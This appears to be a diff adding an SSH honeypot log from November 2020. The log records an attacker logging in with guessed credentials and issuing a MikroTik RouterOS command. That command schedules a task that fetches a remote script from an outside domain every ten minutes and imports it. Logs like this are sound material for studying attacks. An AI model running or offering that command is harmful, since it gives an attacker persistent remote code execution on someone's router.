@@ -1,0 +1,21 @@
+2020-11-18 02:01:49.077 - [Info] MITM Version: 1.26
+2020-11-18 02:01:49.081 - [Info] Auto Access Enabled: true
+2020-11-18 02:01:49.081 - [Debug] [Init] Auto Access Barrier: true
+2020-11-18 02:01:49.095 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-18 02:25:53.649 - [Debug] [Connection] Attacker connected: 88.231.238.73 | Client Identification: SSH-2.0-Go
+2020-11-18 02:25:54.500 - [Debug] [Auth] Attacker 88.231.238.73 trying to authenticate with "none"
+2020-11-18 02:25:54.500 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-18 02:25:54.781 - [Debug] [Auth] Attacker 88.231.238.73 trying to authenticate with "password"
+2020-11-18 02:25:54.781 - [Debug] [Auto Access] Attacker: 88.231.238.73, Threshold: 1, Attempts: 1
+2020-11-18 02:25:54.782 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-18 02:25:54.782 - [Debug] [Auto Access] Adding the following credentials: "guest:m1kr0t1k"
+2020-11-18 02:25:55.019 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-18 02:25:55.019 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-18 02:25:56.310 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-18 02:25:56.872 - [Debug] [EXEC] Noninteractive mode attacker command: /system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://bestony.club/poll/27f633dd-5609-4b6e-8fe4-dbf476f3203e mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
+2020-11-18 02:26:57.379 - [Debug] [Connection] Client error on ssh server
+2020-11-18 02:26:57.380 - [Debug] [Connection] Attacker closed connection
+2020-11-18 02:26:57.384 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-18 02:26:57.384 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-18 02:30:57.566 - [Info] Exiting...
+2020-11-18 02:30:57.566 - [Debug] Cleaning up...
